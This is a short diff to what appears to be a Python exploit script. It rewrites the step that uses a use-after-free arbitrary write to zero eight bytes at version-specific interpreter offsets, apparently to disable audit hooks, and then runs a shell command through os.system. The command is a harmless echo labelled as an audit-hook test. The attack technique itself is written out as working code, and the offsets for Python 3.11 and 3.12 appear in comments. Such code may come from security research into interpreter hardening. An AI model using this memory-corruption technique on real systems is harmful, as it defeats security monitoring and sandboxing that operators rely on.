@@ -25,10 +25,11 @@ uaf = bytearray(56)
 uaf[23] = UAF()
 # end of arbitery writing exploit code
 
-for i in range(0, 8):
-    # the offsets are from POC.py: 
-    # Python 3.11 = 0xe00
-    # Python 3.12 = 0x41448
-    memory[ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 + i] = 0
+# the offsets are from POC.py: 
+# Python 3.11 = 0xe00
+# Python 3.12 = 0x41448
+# start addr
+addr = ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448
+memory[addr : addr + 8] = [0] * 8
 
 ctypes._os.system("echo 'test audit hook -- this will not'")
